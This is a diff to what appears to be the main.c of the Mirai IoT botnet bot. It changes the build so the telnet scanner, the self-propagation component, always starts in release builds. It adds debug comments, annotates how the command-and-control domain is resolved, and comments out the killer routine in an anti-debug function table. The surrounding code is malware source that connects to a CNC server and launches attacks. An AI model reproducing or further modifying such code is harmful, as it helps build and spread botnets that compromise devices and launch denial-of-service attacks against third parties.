@@ -30,6 +30,7 @@ static void establish_connection(void);
 static void teardown_connection(void);
 static void ensure_single_instance(void);
 static BOOL unlock_tbl_if_nodebug(char *);
+void scanner_init(void);
 
 struct sockaddr_in srv_addr;
 int fd_ctrl = -1, fd_serv = -1;
@@ -151,11 +152,15 @@ int main(int argc, char **args)
     close(STDIN);
     close(STDOUT);
     close(STDERR);
+    
 #endif
-
+    
     attack_init();
     killer_init();
+    //printf("[geti] scanner started.\n");
+    //scanner_init();
 #ifndef DEBUG
+    scanner_init();
 #ifdef MIRAI_TELNET
     scanner_init();
 #endif
@@ -268,6 +273,8 @@ int main(int argc, char **args)
                     }
 #ifdef DEBUG
                     printf("[main] Connected to CNC. Local address = %d\n", LOCAL_ADDR);
+                    /*printf("[geti] scanner to be initialized now.");
+                    scanner_init();*/
 #endif
                 }
             }
@@ -360,7 +367,7 @@ static void resolve_cnc_addr(void)
     struct resolv_entries *entries;
 
     table_unlock_val(TABLE_CNC_DOMAIN);
-    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL));
+    entries = resolv_lookup(table_retrieve_val(TABLE_CNC_DOMAIN, NULL)); //here the domain gets resolved to an IP address
     table_lock_val(TABLE_CNC_DOMAIN);
     if (entries == NULL)
     {
@@ -491,7 +498,7 @@ static BOOL unlock_tbl_if_nodebug(char *argv0)
         (void (*) (void))table_lock_val,
         (void (*) (void))util_memcpy,
         (void (*) (void))util_strcmp,
-        (void (*) (void))killer_init,
+        //(void (*) (void))killer_init,
         (void (*) (void))anti_gdb_entry
     };
     BOOL matches;
